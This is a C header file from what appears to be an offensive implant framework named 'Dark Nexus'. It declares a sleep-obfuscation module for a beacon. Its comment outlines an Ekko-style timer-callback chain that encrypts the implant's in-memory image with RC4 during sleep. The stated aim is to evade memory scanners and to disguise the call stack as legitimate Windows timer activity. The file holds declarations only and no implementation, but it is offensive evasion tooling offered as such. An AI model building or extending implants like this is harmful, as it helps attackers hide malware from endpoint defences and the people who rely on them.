#ifndef DN_SLEEP_OBFUSC_H
#define DN_SLEEP_OBFUSC_H

#include <windows.h>

/*
 * Dark Nexus - Sleep Obfuscation
 *
 * During beacon sleep intervals, the implant's memory is a
 * sitting target for periodic memory scanners. Sleep obfuscation
 * encrypts the implant's PE image in-memory before sleeping,
 * then decrypts on wake.
 *
 * Technique: Ekko-style timer-based sleep obfuscation
 *   1. Create a timer queue with callback chain
 *   2. Callback 1: VirtualProtect image to RW
 *   3. Callback 2: SystemFunction032 (RC4) encrypt image
 *   4. Callback 3: WaitForSingleObject (the actual sleep)
 *   5. Callback 4: SystemFunction032 decrypt image
 *   6. Callback 5: VirtualProtect restore RX
 *
 * The entire encrypt-sleep-decrypt sequence runs via timer
 * callbacks, so the call stack during sleep shows legitimate
 * Windows timer infrastructure, not our code.
 *
 * Fallback: if timer-based obfuscation fails, falls back to
 * a simple XOR-encrypt-Sleep-decrypt cycle using direct calls.
 */

// Initialize sleep obfuscation (call once at startup)
// Locates SystemFunction032 and captures image base/size
BOOL dn_sleep_init(void);

// Obfuscated sleep: encrypts image, sleeps, decrypts
// drop-in replacement for Sleep(ms)
void dn_sleep_obfuscated(DWORD milliseconds);

#endif // DN_SLEEP_OBFUSC_H
